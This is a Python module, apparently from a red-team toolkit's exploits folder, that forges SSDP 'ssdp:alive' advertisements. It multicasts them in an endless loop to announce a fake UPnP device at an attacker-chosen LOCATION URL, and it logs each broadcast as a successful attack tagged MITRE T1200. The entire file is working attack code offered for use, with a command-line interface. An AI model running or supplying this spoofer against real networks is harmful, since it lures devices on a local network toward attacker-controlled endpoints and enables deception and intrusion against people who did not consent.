# modules/exploits/ssdp_advertisement_faker.py

import socket
import time
from datetime import datetime
import json
import os

LOG_PATH = "results/exploit_logs.json"
MITRE_TTP = "T1200"  # Hardware Additions (used as deceptive device presence)

def log_ssdp_fake(location, usn):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "fake_device": location,
        "usn": usn,
        "ttp": MITRE_TTP,
        "success": True
    }
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def send_ssdp(location, usn, interval):
    message = (
        f"NOTIFY * HTTP/1.1\r\n"
        f"HOST: 239.255.255.250:1900\r\n"
        f"CACHE-CONTROL: max-age=1800\r\n"
        f"LOCATION: {location}\r\n"
        f"NT: upnp:rootdevice\r\n"
        f"NTS: ssdp:alive\r\n"
        f"SERVER: REDoT/1.0 UPnP/1.1\r\n"
        f"USN: {usn}\r\n\r\n"
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)

    while True:
        sock.sendto(message.encode(), ("239.255.255.250", 1900))
        print(f"[âœ“] SSDP device advertised: {location}")
        log_ssdp_fake(location, usn)
        time.sleep(interval)

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Fake SSDP Advertisement Beacon")
    parser.add_argument("--location", required=True, help="URL or IP:port for fake device description")
    parser.add_argument("--usn", required=True, help="Unique Service Name (UUID)")
    parser.add_argument("--interval", type=int, default=60, help="Broadcast interval in seconds")
    args = parser.parse_args()
    send_ssdp(args.location, args.usn, args.interval)
